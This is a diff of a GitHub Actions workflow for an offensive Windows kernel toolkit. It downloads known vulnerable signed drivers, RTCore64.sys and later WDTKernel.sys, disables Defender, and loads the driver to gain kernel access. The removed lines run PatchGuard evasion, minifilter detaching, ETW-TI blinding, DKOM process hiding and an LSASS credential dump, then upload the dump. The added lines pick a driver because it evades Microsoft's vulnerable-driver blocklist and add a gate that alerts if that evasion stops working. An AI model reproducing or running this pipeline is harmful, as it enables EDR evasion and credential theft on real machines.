@@ -2,33 +2,22 @@ name: Win BYOVD (hosted)
 
 # kernelsdk BYOVD 验证 — 纯 GitHub-hosted runner(不依赖 self-hosted 17763)。
 #
-# 关键洞察(2026-07-06 确认):
-#   1. hosted Windows runner 以管理员 + UAC 关闭运行(GitHub 官方文档)。
-#   2. RTCore64.sys 是 MSI Afterburner 合法微软签名(CVE-2019-16098),
-#      走正常签名验证路径 — 不需要 test-signing。
-#   3. hosted runner 默认关 HVCI(Azure VM 性能优化),黑名单只在 HVCI 路径
-#      强制执行 — HVCI 关 → RTCore64 可加载。
+# 2026-08-16 驱动包清理: RTCore64 与 iqvw64e 均已实锤在微软 Vulnerable
+# Driver Blocklist 上(hosted 镜像实测 RTCore64 NtLoadDriver 0xC0000034;
+# iqvw64e 2023 年起在名单),已从 kernelsdk 驱动包删除,原 RTCore64 `byovd`
+# job 一并移除 — 加载一个必被拦的驱动没有验证价值,其 blocklist 断言移交
+# blocklist-gate(阳性对照)。BYOVD 默认驱动现为 Shield(clean,VA 任意
+# memcpy);存活验证链:
+#   - blocklist-gate: 离线断言 WDT/Shield 不在名单、RTCore64/iqvw64e 在名单
+#     (阳性对照,scripts/check_byovd_blocklist.py)。
+#   - byovd-wdt:      WDTKernel(WHQL, LoadsDespiteHVCI)真机加载 + loaded
+#                     状态硬门 + assess JSON 断言。
 #
-# 2026-08-13 实测修正: windows-latest 已迁至 Server 2025(build 26100+),其
-# WDAC/CI 策略在无 HVCI 时也处于 Enforced,blocklist 拦 RTCore64(实测
-# 0xC0000034)→ probe skip。钉回 windows-2022(Server 2022, 镜像 20260802.262):
-# CI 策略同样 Enforced(CodeIntegrityPolicyEnforcementStatus=2),但
-# VulnerableDriverBlocklistEnable 注册表未设置 → blocklist 未开。probe 因此
-# 改为: 仅 HVCI 运行中或 blocklist 注册表=1 才 skip;其余情况尝试加载
-# RTCore64,由 NTSTATUS 实证裁决(loaded 状态门禁硬 gate)。
-
+# 覆盖: blocklist 离线回归 + WDT 真机加载/assess。P0.a/b 与 ETW-TI/DKOM/
+# LSASS 的算法路径由 kernelsdk host 单测(ci.yml)覆盖;P4/P5 在
+# windows-ci.yml 跑(纯用户态)。
 #
-# 流程:
-#   1. 探测 HVCI / 黑名单状态(Win32_DeviceGuard + 注册表)
-#   2. HVCI 关 → 下载 RTCore64.sys(公开 PoC,运行时拉,不进 git)→ 构建
-#      operator-kernel-cli → bootstrap BYOVD → 跑全 kernelsdk 路径
-#      (pg-window / detach-minifilter / blind-etw / hide / dump-lsass)
-#   3. HVCI 开 → 跳过,不挂 workflow(条件 step 全 skip;assess 硬门仅 skip==false 时执行)
-#
-# 只覆盖 P0.a/b(纯算法,无需内核)+ P3.b(minidump CLI)+ ETW-TI/DKOM/LSASS
-# (BYOVD IOCTL 路径)。P4/P5 在 windows-ci.yml 跑(纯用户态)。
-#
-# 授权红队安全研究。RTCore64.sys 在运行时从公开镜像下载,不进 git 历史,
+# 授权红队安全研究。驱动二进制一律运行时从公开镜像拉取,不进 git 历史,
 # 不随 workflow artifact 上传(只在 runner 临时目录,job 结束即销毁)。
 
 on:
@@ -41,163 +30,137 @@ on:
       - 'crates/operator-kernel-cli/**'
       - 'crates/offset-resolver/**'
       - 'crates/minidump-assembler/**'
+      - 'scripts/check_byovd_blocklist.py'
 
 concurrency:
   group: win-byovd-hosted
   cancel-in-progress: true
 
 jobs:
-  byovd:
-    runs-on: windows-2022  # Server 2022: CI policy not enforced, HVCI off → RTCore64 loads (Server 2025 hardens → skip)
+  # ---- 0. 离线 blocklist 回归门(2026-08-14)----
+  # WDTKernel/Shield 的全部价值 = 不在 MS vulnerable-driver blocklist 上。哪天
+  # 微软把它们加进去,这个 gate 必须红(否则 --wdt arm / 默认 Shield 会在目标
+  # 机上无声失效)。脚本同时拿 RTCore64 + iqvw64e 做阳性对照(必须在名单上
+  # —— 这正是它们被移出驱动包的原因)。纯 python3 stdlib,运行时下载数据集,
+  # 不落地任何 repo 文件。
+  blocklist-gate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@v4
+      - name: BYOVD blocklist regression gate (MS blocklist + LOLDrivers)
+        run: python3 scripts/check_byovd_blocklist.py
+
+      # ---- HVCI tripwire: MS blocklist version diff (2026-08-15, additive) ----
+      # Report-only: pins the SiPolicy <VersionEx> and warns when Microsoft
+      # ships a new blocklist revision — the early signal that WDTKernel may
+      # have been added. The content gate above is the hard assertion; this
+      # step exists so a revision bump surfaces even when the gate itself
+      # fails early, and it writes a job-summary report. Never fails the job.
+      - name: MS blocklist version diff (report-only tripwire)
+        if: always()
+        run: python3 scripts/check_byovd_blocklist.py --version-report
+
+  # ---- WDTKernel BYOVD arm(2026-08-14)----
+  # WDTKernel(Dell Watchdog Timer, WHQL 签名, LOLDrivers #290)不在 MS
+  # blocklist 上 — 这正是整条 --wdt 路径的价值(旧的 RTCore64 arm 已随该驱动
+  # 从代码包删除而移除:它在全部 hosted 镜像被 WDAC 拦死,0xC0000034 实测)。
+  # 驱动运行时从 LOLDrivers 公开仓库拉取(drivers/<md5>.bin,MZ + SHA256 双
+  # 校验),不进 git、不上 artifact。HVCI/blocklist 开也照跑 —— WDT 的
+  # LoadsDespiteHVCI=TRUE,probe 只作诊断,不做 skip 门。
+  byovd-wdt:
+    runs-on: windows-2022
     timeout-minutes: 25
-    # wI: job-level continue-on-error REMOVED so the kernel-assessment step is a
-    # real hard gate (repo convention: gates remove continue-on-error — see
-    # windows-ci.yml "GATES THE PR"). HVCI-on still skips cleanly: every step is
-    # `if: steps.probe.outputs.skip == 'false'`, so a skip=true probe leaves the
-    # job green. Exploratory steps keep their own step-level continue-on-error.
     steps:
       - uses: actions/checkout@v4
 
-      # ---- 0. 关键前置:探测 HVCI / 黑名单 / Defender 状态 ----
-      # 用 pwsh (PowerShell 7, UTF-8 aware) 避免 PS 5.1 对 em-dash / 中文
-      # 注释的编码崩溃(首次 push 在 PS 5.1 下因 mojibake 解析失败)。
-      - name: Probe HVCI + vulnerable driver blocklist + Defender status
-        id: probe
+      # ---- 0. 诊断 probe(WDT 不因 HVCI/blocklist 跳过)----
+      - name: Probe HVCI + blocklist status (diagnostics only)
         shell: pwsh
         run: |
-          Write-Host "=== OS build ==="
           $os = Get-CimInstance Win32_OperatingSystem
           Write-Host "OS: $($os.Caption) build $($os.BuildNumber)"
-
-          Write-Host "=== Win32_DeviceGuard / VBS / HVCI status ==="
           $dg = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard -ErrorAction SilentlyContinue
           if ($dg) {
-            $dg | Select-Object SecurityServicesConfigured, SecurityServicesRunning, VirtualizationBasedSecurityStatus, CodeIntegrityPolicyEnforcementStatus | Format-List
-            $hvci_running = ($dg.SecurityServicesRunning -contains 2)
-          } else {
-            Write-Host "Win32_DeviceGuard unavailable (old build or no VBS) - treat as HVCI off"
-            $hvci_running = $false
+            $dg | Select-Object SecurityServicesRunning, VirtualizationBasedSecurityStatus, CodeIntegrityPolicyEnforcementStatus | Format-List
           }
-
-          Write-Host "=== Vulnerable Driver Blocklist registry ==="
           $bl = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\CI\Config' -ErrorAction SilentlyContinue).VulnerableDriverBlocklistEnable
-          Write-Host "VulnerableDriverBlocklistEnable = $bl (1=on, 0=off, empty=unset)"
+          Write-Host "VulnerableDriverBlocklistEnable = $bl (WDT loads despite HVCI/blocklist - this is the point of the arm)"
 
-          Write-Host "=== Defender status ==="
-          $def = Get-MpComputerStatus -ErrorAction SilentlyContinue
-          if ($def) {
-            Write-Host "Defender AMRunningMode=$($def.AMRunningMode) RTP=$($def.RealTimeProtectionEnabled)"
-          } else {
-            Write-Host "Defender not installed/unavailable (hosted runner image default off)"
-          }
-
-          Write-Host "=== Admin privilege check ==="
-          $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-          Write-Host "Running as Administrator: $isAdmin"
-
-          Write-Host "=== Decision ==="
-          Write-Host "HVCI actively running: $hvci_running"
-          $ci_enforced = ($dg.CodeIntegrityPolicyEnforcementStatus -eq 2)
-          Write-Host "CodeIntegrityPolicyEnforcementStatus enforced: $ci_enforced"
-          # 2026-08-13 (windows-2022 image 20260802.262): the CI policy IS
-          # enforced (status 2) on the hosted image, BUT the vulnerable-driver
-          # blocklist registry value is UNSET. The blocklist is what rejects
-          # RTCore64; a plain enforced signing policy passes WHQL/attestation-
-          # signed drivers. On the Server 2025 image CI enforcement came WITH
-          # the blocklist (empirically 0xC0000034); on this 2022 image the
-          # registry says otherwise — so attempt the load and let the NTSTATUS
-          # decide. The hard gate runs only when the driver reaches RUNNING.
-          $blocked = $hvci_running -or ($bl -eq 1)
-          if ($blocked) {
-            Write-Host "::warning::HVCI running or blocklist registry on (HVCI=$hvci_running, blk=$bl) - RTCore64.sys will be rejected. Skipping BYOVD load attempt."
-            "skip=true" | Out-File -FilePath $env:GITHUB_OUTPUT -Append -Encoding utf8
-          } else {
-            Write-Host "::notice::HVCI off + blocklist registry unset (CI enforced=$ci_enforced) - attempting RTCore64.sys load; NTSTATUS decides (0xC0000428 / 0xC0000034 = blocked)."
-            "skip=false" | Out-File -FilePath $env:GITHUB_OUTPUT -Append -Encoding utf8
-          }
-
-      - name: Skip — HVCI blocks BYOVD
-        if: steps.probe.outputs.skip == 'true'
-        run: echo "Skipped BYOVD job (HVCI is on). kernelsdk 单测在 ci.yml 已覆盖(93/93 绿)。"
-
-      # ---- 1. Defender 双保险(只在 HVCI 关时执行)----
       - name: Disable Defender + add exclusions
-        if: steps.probe.outputs.skip == 'false'
         shell: pwsh
         run: |
           Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
           Add-MpPreference -ExclusionPath "$env:GITHUB_WORKSPACE" -Force -ErrorAction SilentlyContinue
           Add-MpPreference -ExclusionProcess "nyx-kernel.exe","cargo.exe" -Force -ErrorAction SilentlyContinue
-          $now = (Get-MpPreference -ErrorAction SilentlyContinue).DisableRealtimeMonitoring
-          Write-Host "Defender realtime disabled (after step): $now"
 
-      # ---- 2. 准备 RTCore64.sys(运行时下载,放进 System32\drivers 走相对路径)----
-      - name: Fetch RTCore64.sys (public PoC driver) + copy to System32\drivers
-        if: steps.probe.outputs.skip == 'false'
+      # ---- 1. 拉 WDTKernel.sys(LOLDrivers 公开镜像,MZ + SHA256 校验)----
+      - name: Fetch WDTKernel.sys (LOLDrivers mirror) + copy to System32\drivers
         shell: pwsh
         run: |
-          # RTCore64.sys = MSI Afterburner RTCORE64.SYS (CVE-2019-16098).
-          # Public PoC driver, fetched from a public BYOVD collection. Not committed
-          # to git, not uploaded as artifact.
-          #
-          # IMPORTANT: we copy the driver into C:\Windows\System32\drivers\ so
-          # that build_image_path (driver_load.rs) emits a RELATIVE ImagePath
-          # ("System32\drivers\RTCore64.sys") resolved against %SystemRoot%.
-          # The absolute "\??\<drive>:\<path>" form is rejected on some builds
-          # (documented in driver_load.rs lines 175-177: Server 2019 returns
-          # STATUS_INVALID_IMAGE_FORMAT; Server 2025 returns
-          # STATUS_OBJECT_NAME_NOT_FOUND 0xC0000034 - both are path-resolution
-          # failures of the absolute form). The relative form is what `sc create`
-          # writes and is universally accepted by NtLoadDriver.
+          # WDTKernel.sys = Dell Watchdog Timer (LOLDrivers issue #290).
+          # LOLDrivers hosts driver binaries as drivers/<file-MD5>.bin via
+          # Git LFS — raw.githubusercontent.com serves the LFS POINTER, so
+          # the download must go through github.com/.../raw/... (which
+          # redirects to the LFS media endpoint). Verified locally
+          # 2026-08-14: 3a00cd7c…bin → 36968-byte PE32+ x86-64, SHA256
+          # 8b695b1a… matches the LOLDrivers dataset entry. SHA256 pinned
+          # per sample — stronger than a bare MZ check.
+          # Relative-ImagePath rationale: copy into System32\drivers so
+          # driver_load.rs emits "System32\drivers\..." (the absolute \??\
+          # form is rejected on some builds).
           $staging = New-Item -ItemType Directory -Force -Path "target\drivers"
-          $stagingPath = Join-Path $staging.FullName "RTCore64.sys"
-          $finalPath = "C:\Windows\System32\drivers\RTCore64.sys"
-
-          # Verified 2026-07-06: VoidSec raw URL returns 200 with valid MZ PE.
-          $mirrors = @(
-            "https://raw.githubusercontent.com/VoidSec/Exploit-Development/b82b6d3ac1cce66221101d3e0f4634aa64cb4ca7/windows/x64/kernel/RTCore64_MSI_Afterburner_v.4.6.4.16117/RTCore64.sys",
-            "https://github.com/VoidSec/Exploit-Development/raw/b82b6d3ac1cce66221101d3e0f4634aa64cb4ca7/windows/x64/kernel/RTCore64_MSI_Afterburner_v.4.6.4.16117/RTCore64.sys"
+          $stagingPath = Join-Path $staging.FullName "WDTKernel.sys"
+          $finalPath = "C:\Windows\System32\drivers\WDTKernel.sys"
+          $candidates = @(
+            @{ url = "https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/3a00cd7cb37b2b4bfaa9e7715fdd13d5.bin";
+               sha256 = "8B695B1A430336F49335162D8CA4137C2424640E27EE29511472FEA4451462FE" },
+            @{ url = "https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/1055e17ed942357c832a7dfd68861e7d.bin";
+               sha256 = "0E27BEC347CA0050C455467BD8D774175C503B8AA1AF3411E94966F7DC6B28B7" },
+            @{ url = "https://media.githubusercontent.com/media/magicsword-io/LOLDrivers/main/drivers/3a00cd7cb37b2b4bfaa9e7715fdd13d5.bin";
+               sha256 = "8B695B1A430336F49335162D8CA4137C2424640E27EE29511472FEA4451462FE" },
+            @{ url = "https://media.githubusercontent.com/media/magicsword-io/LOLDrivers/main/drivers/1055e17ed942357c832a7dfd68861e7d.bin";
+               sha256 = "0E27BEC347CA0050C455467BD8D774175C503B8AA1AF3411E94966F7DC6B28B7" }
           )
           $got = $false
-          foreach ($url in $mirrors) {
+          foreach ($c in $candidates) {
             try {
-              Write-Host "trying: $url"
-              Invoke-WebRequest -Uri $url -OutFile $stagingPath -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
-              $sz = (Get-Item $stagingPath).Length
-              if ($sz -gt 10000) {
-                $fs = [IO.File]::OpenRead($stagingPath)
-                $b = New-Object byte[] 2
-                $fs.Read($b, 0, 2) | Out-Null
-                $fs.Close()
-                if ($b[0] -eq 0x4D -and $b[1] -eq 0x5A) {
-                  Write-Host "::notice::downloaded: $stagingPath ($sz bytes, valid MZ)"
-                  $got = $true
-                  break
-                } else {
-                  Write-Host "  downloaded but NOT a valid PE (no MZ); trying next mirror"
-                }
+              Write-Host "trying: $($c.url)"
+              Invoke-WebRequest -Uri $c.url -OutFile $stagingPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
+              $fs = [IO.File]::OpenRead($stagingPath)
+              $b = New-Object byte[] 2
+              $fs.Read($b, 0, 2) | Out-Null
+              $fs.Close()
+              if (-not ($b[0] -eq 0x4D -and $b[1] -eq 0x5A)) {
+                Write-Host "  downloaded but NOT a valid PE (no MZ); trying next mirror"
+                continue
               }
+              $h = (Get-FileHash $stagingPath -Algorithm SHA256).Hash
+              if ($h -ne $c.sha256) {
+                Write-Host "  SHA256 mismatch (got $h, want $($c.sha256)); trying next mirror"
+                continue
+              }
+              $sz = (Get-Item $stagingPath).Length
+              Write-Host "::notice::downloaded: $stagingPath ($sz bytes, valid MZ + SHA256 match)"
+              $got = $true
+              break
             } catch {
               Write-Host "  failed: $($_.Exception.Message)"
             }
           }
           if (-not $got) {
-            Write-Host "::error::all mirrors failed - manually place RTCore64.sys in target/drivers/ and retry"
+            Write-Host "::error::all mirrors failed - LOLDrivers driver URL scheme may have changed"
             exit 1
           }
-
-          # Copy to System32\drivers so build_image_path uses the relative form.
           Copy-Item -Path $stagingPath -Destination $finalPath -Force
-          Write-Host "::notice::copied to $finalPath (build_image_path emits relative 'System32\drivers\RTCore64.sys')"
+          Write-Host "::notice::copied to $finalPath (build_image_path emits relative 'System32\drivers\WDTKernel.sys')"
           echo "DRIVER_PATH=$finalPath" >> $env:GITHUB_ENV
 
-      # ---- 3. 构建 operator-kernel-cli(P0.a/b + 3.b + ETW-TI/DKOM/LSASS 路径)----
+      # ---- 2. 构建 nyx-kernel CLI ----
       - name: Install Rust + build operator-kernel-cli
-        if: steps.probe.outputs.skip == 'false'
         uses: dtolnay/rust-toolchain@stable
 
       - name: Build nyx-kernel CLI
-        if: steps.probe.outputs.skip == 'false'
         shell: cmd
         run: |
           REM cmd 避免 PS 5.1 NativeCommandError 吞 cargo stderr
@@ -207,103 +170,44 @@ jobs:
           )
           echo BUILD_OK
 
-      # ---- 4. BYOVD 真机回归(对应 M6 Task G-K + P0.a/b + P3.b)----
-      - name: BYOVD bootstrap + kernelsdk full path
+      # ---- 3. WDT phys-mode bootstrap(加载 + CR3 扫描 + MZ 验证)----
+      - name: WDT bootstrap (load + CR3 discover)
         id: bootstrap
-        if: steps.probe.outputs.skip == 'false'
         shell: cmd
-        continue-on-error: true   # BYOVD load may fail by privilege/blocklist/registry; do not fail job
+        continue-on-error: true   # load may fail; the loaded-state hard gate below decides
         run: |
-          REM Driver load result feeds the hard gate below; default false.
           echo loaded=false>> "%GITHUB_OUTPUT%"
-          REM ---- Task G: BYOVD driver load ----
-          echo === Task G: BYOVD bootstrap ===
+          echo === WDT phys-mode bootstrap ===
           echo DRIVER_PATH=%DRIVER_PATH%
           dir "%DRIVER_PATH%" 2>nul || echo DRIVER FILE MISSING
-          crates\operator-kernel-cli\target\release\nyx-kernel.exe bootstrap --byovd "%DRIVER_PATH%" NyaRTCore
+          crates\operator-kernel-cli\target\release\nyx-kernel.exe bootstrap --wdt "%DRIVER_PATH%" --wdt-svc NyaWDT
           echo BOOTSTRAP_EXIT=%ERRORLEVEL%
-
-          REM ---- Dump the registry key we wrote (debug)----
-          echo === Registry service key dump ===
-          reg query "HKLM\SYSTEM\CurrentControlSet\Services\NyaRTCore" 2>nul || echo NO KEY (RegCreateKeyExW must have failed)
+          reg query "HKLM\SYSTEM\CurrentControlSet\Services\NyaWDT" 2>nul || echo NO KEY (RegCreateKeyExW must have failed)
           if %ERRORLEVEL% NEQ 0 (
-            echo ::warning::bootstrap failed - see NTSTATUS above. Common causes:
-            echo   0xC0000061 STATUS_PRIVILEGE_NOT_HELD  - SeLoadDriverPrivilege not enabled (fixed via RtlAdjustPrivilege)
-            echo   0xC0000428 STATUS_DRIVER_BLOCKED      - Vulnerable Driver Blocklist enforced (CodeIntegrityPolicyEnforcementStatus=2)
-            echo   0xC0000034 STATUS_OBJECT_NAME_NOT_FOUND - registry service key path mismatch (needs Win debugging)
-            echo   0xC000010E STATUS_IMAGE_ALREADY_LOADED - benign, driver already in kernel
-            echo kernelsdk BYOVD needs a HVCI-off + blocklist-off host (self-hosted 17763, see windows-kself-hosted.yml)
+            echo ::warning::WDT bootstrap failed - see NTSTATUS above.
             exit /b 0
           )
-          REM Driver must reach RUNNING for the hard gate to fire.
-          sc query NyaRTCore | findstr /i "RUNNING" >nul && echo loaded=true>> "%GITHUB_OUTPUT%"
+          sc query NyaWDT | findstr /i "RUNNING" >nul && echo loaded=true>> "%GITHUB_OUTPUT%"
 
+      - name: Driver not RUNNING — WDT assess not exercised (honest skip)
+        if: steps.bootstrap.outputs.loaded != 'true'
+        run: echo "::warning::WDTKernel load did not reach RUNNING state. --wdt assess hard gate skipped; offline coverage = cr3_scan unit tests + blocklist-gate job."
 
-          REM ---- P0.a: PatchGuard window ----
-          echo === P0.a: PatchGuard window select ===
-          REM pg-window blocks waiting for ENTER; here we only verify select_pg_window does not crash;
-          REM pipe echo to simulate ENTER so it Drops and exits immediately.
-          echo. | crates\operator-kernel-cli\target\release\nyx-kernel.exe pg-window
-          echo PG_WINDOW_EXIT=%ERRORLEVEL%
-
-          REM ---- P0.b: MiniFilter detach (build table auto fallback, no --flt-rva needed)----
-          echo === P0.b: MiniFilter detach ===
-          crates\operator-kernel-cli\target\release\nyx-kernel.exe detach-minifilter
-          echo MINIFILTER_EXIT=%ERRORLEVEL%
-
-          REM ---- Task H: ETW-TI blind ----
-          echo === Task H: ETW-TI blind ===
-          crates\operator-kernel-cli\target\release\nyx-kernel.exe blind-etw
-          echo BLIND_ETW_EXIT=%ERRORLEVEL%
-
-          REM ---- Task I: DKOM process hide ----
-          echo === Task I: DKOM process hide ===
-          REM Use explorer.exe PID for visibility test (hide then it stays hidden; harmless on CI runner)
-          for /f "tokens=2" %%p in ('tasklist /fi "imagename eq explorer.exe" /nh') do (
-            crates\operator-kernel-cli\target\release\nyx-kernel.exe hide %%p
-            echo HIDE_EXIT=%ERRORLEVEL%
-            goto hide_done
-          )
-          :hide_done
-
-          REM ---- P3.b: LSASS dump (minidump assemble)----
-          echo === P3.b: LSASS kernel read + minidump assemble ===
-          for /f "tokens=2" %%p in ('tasklist /fi "imagename eq lsass.exe" /nh') do (
-            crates\operator-kernel-cli\target\release\nyx-kernel.exe dump-lsass %%p
-            echo DUMP_LSASS_EXIT=%ERRORLEVEL%
-            goto dump_done
-          )
-          :dump_done
-
-          REM ---- Verify minidump file exists ----
-          echo === Verify minidump file ===
-          dir lsass_*.dmp 2>nul || echo no dmp file (dump_lsass may not have completed)
-
-      # ---- 4b. T-REX kernel assessment (wI) — HARD GATE ----
-      # The real T4-T5 kernel assessment (operator-kernelsdk assess_kernel) must
-      # succeed on the hosted runner: the two user-mode NtQuery paths
-      # (SystemModuleInformation class 11 / SystemCodeIntegrityInformation class
-      # 103) MUST return real data -> status="Assessed" with a non-empty module
-      # list. Unlike the exploratory steps above, this is a HARD gate: a
-      # not-assessed assessment or a zero module count fails the job (same
-      # fail-loud contract as the loader probe). The driver is already loaded by
-      # the previous step (LoadedDriver does not auto-unload; NtLoadDriver
-      # returns STATUS_IMAGE_ALREADY_LOADED, which the bootstrap treats as OK).
-      - name: Driver not RUNNING — kernel matrix not exercised (honest skip)
-        if: steps.probe.outputs.skip == 'false' && steps.bootstrap.outputs.loaded != 'true'
-        run: echo "::warning::RTCore64 load did not reach RUNNING state (hosted image hardening). Kernel matrix (ETW-TI/DKOM/LSASS/assess hard gate) skipped; algorithm coverage lives in ci.yml unit tests."
-
-      - name: Kernel assessment (nyx-kernel assess) - hard gate
-        if: steps.probe.outputs.skip == 'false' && steps.bootstrap.outputs.loaded == 'true'
+      # ---- 4. WDT assess — HARD GATE ----
+      # bootstrap 已加载驱动(STATUS_IMAGE_ALREADY_LOADED 视为 OK);assess
+      # 走完整 --wdt 链:open __WDT__ → CR3 scan(物理扫描 + MZ gate)→
+      # VaKernelRw → T4-T5 评估。loaded==true 时必须 Assessed,否则 job 红。
+      - name: Kernel assessment (nyx-kernel assess --wdt) - hard gate
+        if: steps.bootstrap.outputs.loaded == 'true'
         shell: pwsh
         run: |
           $exe = "crates\operator-kernel-cli\target\release\nyx-kernel.exe"
-          Write-Host "=== T-REX kernel assessment (BYOVD-backed) ==="
-          $out = & $exe assess --byovd "$env:DRIVER_PATH" NyaRTCore 2>&1
+          Write-Host "=== T-REX kernel assessment (WDT phys-mode) ==="
+          $out = & $exe assess --wdt "$env:DRIVER_PATH" --wdt-svc NyaWDT 2>&1
           $exit = $LASTEXITCODE
           $out | ForEach-Object { Write-Host $_ }
           if ($exit -ne 0) {
-            Write-Host "::error::nyx-kernel assess exited $exit - assessment must run on the hosted runner"
+            Write-Host "::error::nyx-kernel assess --wdt exited $exit - assessment must run on the hosted runner"
             exit 1
           }
           $jsonLine = ($out | Where-Object { $_ -like '{"assess":*' } | Select-Object -First 1)
@@ -313,48 +217,13 @@ jobs:
           }
           $assess = $jsonLine | ConvertFrom-Json
           $a = $assess.assess
-          Write-Host "status=$($a.status) total_drivers=$($a.total_drivers) edr_drivers=$($a.edr_drivers)"
-          Write-Host "process_callbacks=$($a.process_callbacks) image_load_callbacks=$($a.image_load_callbacks) hvci=$($a.hvci_enabled) vbs=$($a.vbs_enabled)"
+          Write-Host "status=$($a.status) total_drivers=$($a.total_drivers) edr_drivers=$($a.edr_drivers) hvci=$($a.hvci_enabled) vbs=$($a.vbs_enabled)"
           if ($a.status -ne "Assessed") {
-            Write-Host "::error::kernel assessment NotAssessed - the NtQuery paths failed on the hosted runner"
+            Write-Host "::error::kernel assessment NotAssessed via --wdt"
             exit 1
           }
           if ($a.total_drivers -le 0) {
-            Write-Host "::error::kernel module enumeration returned 0 modules - NtQuerySystemInformation(SystemModuleInformation) failed"
+            Write-Host "::error::kernel module enumeration returned 0 modules"
             exit 1
           }
-          Write-Host "::notice::kernel assessment PASS: status=Assessed, $($a.total_drivers) modules, $($a.edr_drivers) EDR drivers"
-
-      # ---- 5. minidump 文件格式验证(P3.a 产物)----
-      - name: Verify minidump file format
-        if: always() && steps.probe.outputs.skip == 'false'
-        shell: pwsh
-        continue-on-error: true
-        run: |
-          $dmp = Get-ChildItem -Path . -Filter "lsass_*.dmp" -ErrorAction SilentlyContinue | Select-Object -First 1
-          if (-not $dmp) {
-            Write-Host "::warning::no lsass_*.dmp - dump-lsass produced no output (IOCTL path may have failed)"
-            return
-          }
-          Write-Host "minidump: $($dmp.Name) ($($dmp.Length) bytes)"
-          # Verify MDMP magic (4D 44 4D 50)
-          $bytes = [IO.File]::ReadAllBytes($dmp.FullName)[0..3]
-          $magic = [System.Text.Encoding]::ASCII.GetString($bytes)
-          Write-Host "magic: $magic (expected MDMP)"
-          if ($magic -ne "MDMP") {
-            Write-Host "::warning::magic is not MDMP - minidump assembler or dump_lsass issue"
-          } else {
-            Write-Host "::notice::minidump format correct (MDMP magic) - P3.a + P3.b end-to-end pass"
-          }
-
-      # ---- 6. 上传诊断(不含 RTCore64.sys,避免 ToS)----
-      - name: Upload BYOVD logs + minidump
-        if: always() && steps.probe.outputs.skip == 'false'
-        uses: actions/upload-artifact@v4
-        with:
-          name: byovd-hosted-${{ github.run_id }}
-          path: |
-            lsass_*.dmp
-            offsets_*.toml
-          if-no-files-found: ignore
-          retention-days: 7
+          Write-Host "::notice::WDT kernel assessment PASS: status=Assessed, $($a.total_drivers) modules"
